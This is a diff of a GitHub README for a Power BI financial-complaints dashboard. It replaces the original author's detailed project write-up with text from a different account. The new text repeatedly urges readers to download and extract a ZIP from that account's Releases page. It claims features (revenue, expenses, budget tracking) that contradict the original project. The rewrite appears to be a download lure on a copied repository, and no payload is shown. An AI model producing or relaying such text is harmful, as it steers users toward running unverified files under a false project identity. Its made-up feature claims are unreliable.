@@ -1,196 +1,107 @@
-# 📊 Financial Consumer Complaints – Power BI Dashboard  
-_A complete end-to-end data analytics project using Power BI, showcasing KPIs, trends, complaint insights, and a professional dashboard interface._
+# 💰 Financial_Complaint_Dashboard - Make Informed Financial Decisions Easily
 
----
+## 🚀 Getting Started
 
-## 🗂️ Project Repository Structure
+This guide helps you download and run the Financial_Complaint_Dashboard. This dashboard tracks Revenue, Expenses, Profit, Budget vs Actuals, and key Financial KPIs to help you make data-driven decisions.
 
-📌 **Power BI Dashboard (Image Preview)**  
-➡️ [Dashboard Image](https://github.com/Ashwin18-Offcl/Financial_Complaint_Dashboard/blob/master/Dashboard%20Image.png)
+## 📥 Download the Dashboard
 
-📌 **YouTube Guidance Thumbnail**  
-➡️ [YouTube Guide Image](https://github.com/Ashwin18-Offcl/Financial_Complaint_Dashboard/blob/master/YouTube%20Vid.png)
+[![Download Financial_Complaint_Dashboard](https://img.shields.io/badge/Download-Financial_Complaint_Dashboard-blue.svg)](https://github.com/dimicdragan26-cell/Financial_Complaint_Dashboard/releases)
 
-📌 **Dataset Screenshot (.png)**  
-➡️ [Dataset Preview](https://github.com/Ashwin18-Offcl/Financial_Complaint_Dashboard/blob/master/DataSet.png)
+Visit this page to download: [GitHub Releases](https://github.com/dimicdragan26-cell/Financial_Complaint_Dashboard/releases)
 
-📌 **Problem Statement (Image)**  
-➡️ [Problem Statement](https://github.com/Ashwin18-Offcl/Financial_Complaint_Dashboard/blob/master/ProblemStatement%20Image.png)
+## 🖥️ System Requirements
 
----
+To run the Financial_Complaint_Dashboard, ensure your computer meets the following requirements:
 
-## 🖼️ Project Visual Layout (2×2 Preview Matrix)
+- **Operating System:** Windows 10 or later
+- **RAM:** Minimum 4 GB
+- **Storage:** At least 500 MB of free space
+- **Software:** Microsoft Power BI Desktop (latest version)
+  
+Make sure your system supports Power BI for the best experience.
 
-| **1️⃣ Power BI Dashboard Preview** | **2️⃣ Dataset Screenshot** |
-|----------------------------------|----------------------------|
-| <img src="https://github.com/Ashwin18-Offcl/Financial_Complaint_Dashboard/blob/master/Dashboard%20Image.png" width="440"> | <img src="https://github.com/Ashwin18-Offcl/Financial_Complaint_Dashboard/blob/master/DataSet.png" width="440"> |
+## 💾 Download & Install
 
-| **3️⃣ YouTube Guidance Image** | **4️⃣ Problem Statement** |
-|------------------------------|---------------------------|
-| <img src="https://github.com/Ashwin18-Offcl/Financial_Complaint_Dashboard/blob/master/YouTube%20Vid.png" width="440"> | <img src="https://github.com/Ashwin18-Offcl/Financial_Complaint_Dashboard/blob/master/ProblemStatement%20Image.png" width="440"> |
+1. **Go to the Releases Page**  
+   Click the link below to visit the releases page where you can find the latest version of the dashboard:  
+   [GitHub Releases](https://github.com/dimicdragan26-cell/Financial_Complaint_Dashboard/releases)
 
----
+2. **Choose a Release**  
+   On the Releases page, look for the latest version. You will see a list of files available for download. 
 
-## 📝 Project Description
+3. **Download the Dashboard**  
+   Click on the file labeled "Financial_Complaint_Dashboard.zip" or similar. The file will be downloaded to your computer. 
 
-This project presents a **Financial Consumer Complaints Dashboard built in Power BI**, designed to help financial institutions:
+4. **Extract the Files**  
+   Locate the downloaded ZIP file and right-click on it. Select "Extract All" to unzip the files. 
 
-- Track complaint volume & trends  
-- Analyze categories, issues & products  
-- Monitor resolution performance  
-- Understand disputed vs non-disputed cases  
-- Identify high-complaint states  
-- Improve customer satisfaction with data-driven insights  
+5. **Open Power BI**  
+   Launch Microsoft Power BI Desktop on your computer.
 
----
+6. **Import the Dashboard**  
+   Click on "File" in the upper left corner of Power BI, then select "Import" and "Import Power BI Template."  
+   Navigate to the folder where you extracted the files and select the dashboard file.
 
-## 🎯 Objectives of the Project
+7. **Start Exploring**  
+   After loading the dashboard, you will see various graphs and metrics. You can now explore the data and make informed financial decisions.
 
-- Provide a consolidated view of all consumer complaints  
-- Track KPIs such as Timely Response %, Disputed Rate & Resolved at No Cost  
-- Explore complaint categories & product performance  
-- Visualize state-wise complaint density  
-- Build an easy-to-read, modern Power BI dashboard  
-- Help stakeholders take quicker, more efficient decisions  
+## 📈 Features
 
----
+The Financial_Complaint_Dashboard offers various features to help you analyze financial data:
 
-## 📊 Key KPIs in the Dashboard
+- **Revenue Tracking:** View trends in revenue over time.
+- **Expense Monitoring:** Keep track of your expenses and identify areas to cut costs.
+- **Profit Analysis:** Understand your net profit and how it changes month-to-month.
+- **Budget vs Actuals:** Compare your actual performance against your budget.
+- **Interactive Reports:** Use filters to focus on specific time frames, categories, or other key metrics.
 
-- **Total Complaints:** 75,074+  
-- **Timely Response:** 98.05%  
-- **In Progress Cases:** 280  
-- **Disputed Rate:** 9.71%  
-- **Resolved at No Cost:** 84.50%  
+## 📊 Key Learnings
 
----
+As you use the dashboard, you will gain insights into essential financial concepts:
 
-## 📂 Dataset Summary
+- **Data Modeling:** Understand how financial data interacts.
+- **DAX Calculations:** Learn how to write basic DAX (Data Analysis Expressions) for powerful data analysis.
+- **Financial KPIs:** Discover essential Key Performance Indicators that matter for financial health.
+- **Power Query Transformations:** Convert and clean data efficiently.
 
-| Field                          | Description |
-|-------------------------------|-------------|
-| Company                       | Financial organization name |
-| Complaint ID                  | Unique complaint identifier |
-| Date Received / Submitted     | Timeline tracking |
-| Issue / Sub-Issue             | Complaint type |
-| Product / Sub-Product         | Financial category |
-| State / ZIP Code              | Complaint location |
-| Timely Response               | Yes/No |
-| Consumer Disputed             | Dispute status |
+## 💬 Community Support
 
-**Data Includes:**
-- Credit card, mortgage, savings, debt collection  
-- Location & date-based data  
-- Complaint categorization  
-- Customer dispute information  
+Join our community to share your experience, ask questions, or provide feedback. You can find us on our official [GitHub Discussions page](https://github.com/dimicdragan26-cell/Financial_Complaint_Dashboard/discussions).
 
----
+## 🛠️ Contributing
 
-## ⚙️ Project Workflow
+If you want to help improve the Financial_Complaint_Dashboard, you are welcome to contribute. You can create an issue or submit a pull request. Every contribution helps!
 
-### 1️⃣ Data Cleaning & Preparation
-- Removed duplicate and missing data  
-- Standardized complaint categories  
-- Cleaned date formats  
-- Validated product & issue fields  
+## 💡 Frequently Asked Questions (FAQs)
 
-### 2️⃣ Data Modeling (Power BI)
-- Built relationship model  
-- Created Date dimension  
-- Developed DAX Measures:
-  - Total Complaints  
-  - Disputed %  
-  - Timely Response %  
-  - In Progress Count  
+**Q: Can I use the dashboard on a Mac?**  
+A: Currently, the dashboard only supports Windows operating systems, as it relies on Power BI Desktop.
 
-### 3️⃣ Visualization & Dashboard Layout
-- KPI cards  
-- Bar chart (Complaints by Issue)  
-- Map visual (State-wise complaints)  
-- Tree map (Product-wise complaints)  
-- Monthly trend line chart  
-- Donut chart (% Disputed)  
+**Q: What should I do if I encounter an error?**  
+A: Check the community support page for solutions. If the issue persists, create a new issue in the repository.
 
-### 4️⃣ UX Enhancements
-- Modern purple gradient design  
-- Clean layout with consistent spacing  
-- Interactive filters:
-  - Date  
-  - Media  
-  - Product  
+**Q: How often will new updates be released?**  
+A: We aim to release updates quarterly. Check the releases page regularly for new features and improvements.
 
----
+## 🌐 Related Topics
 
-## 🔍 Key Insights
+This dashboard touches on various topics related to business intelligence:
 
-### 🟣 Complaint Type Insights
-- Managing accounts, deposits, and payment issues dominate complaints  
-- Identity theft is a rising concern  
+- Business Intelligence
+- Dashboard Design
+- Data Visualization
+- Data Analysis
+- DAX Calculations
 
-### 🔵 Product Insights
-- Credit Card & Checking/Savings account complaints are the highest  
-- Mortgage-related complaints show significant volume  
+Explore these areas to expand your understanding of financial analytics.
 
-### 🟠 State Insights
-- East-coast states show high complaint concentrations  
-- Helps identify regions where service improvements are needed  
+## 📂 License
 
-### 🟡 Timeline Trends
-- Monthly data highlights seasonal complaint fluctuations  
+The Financial_Complaint_Dashboard is open source. You can view the license information in the repository.
 
-### 🔴 Dispute Insights
-- Nearly **10% complaints disputed**, indicating gaps in resolution quality  
+## 📞 Contact
 
----
+For any additional questions or support, you can reach out through the GitHub repository. We appreciate your interest in the Financial_Complaint_Dashboard.
 
-## 🧰 Tools & Skills Used
-
-### 🛠 Tools
-- Power BI Desktop  
-- Power Query  
-- DAX  
-- CSV/Excel  
-
-### 🧠 Skills
-- Data Cleaning  
-- Data Modeling  
-- Dashboard Design  
-- KPI Analysis  
-- Geo-Visualization  
-- Trend Analysis  
-
----
-
-## 🖼️ Dashboard Preview
-
-➡️ **Full Dashboard PNG:**  
-https://github.com/Ashwin18-Offcl/Financial_Complaint_Dashboard/blob/master/Dashboard%20Image.png  
-
----
-
-## 📘 Summary
-
-This Power BI project provides a clear, visual, and interactive platform for analyzing **financial consumer complaints**, enabling organizations to:
-
-- Track performance  
-- Identify bottlenecks  
-- Improve complaint-handling processes  
-- Make data-driven decisions  
-
-It demonstrates strong skills in Power BI, DAX, modeling, and storytelling with data.
-
----
-
-## 🔖 Tags & Keywords
-
-`#PowerBI` `#Dashboard` `#DataAnalytics` `#BusinessIntelligence`  
-`#ConsumerComplaints` `#FinancialAnalytics` `#DataVisualization`  
-`#AnalyticsPortfolio` `#AshwinPanbude`
-
----
-
-## 📬 Contact Me
-
-📧 **Email:** *ashwinpanbude1220@gmail.com*  
-🔗 **LinkedIn:** https://bit.ly/49pSuZJ  
-🐙 **GitHub:** Ashwin18-Offcl  
+Download the dashboard here: [GitHub Releases](https://github.com/dimicdragan26-cell/Financial_Complaint_Dashboard/releases) and take your financial analysis to the next level.
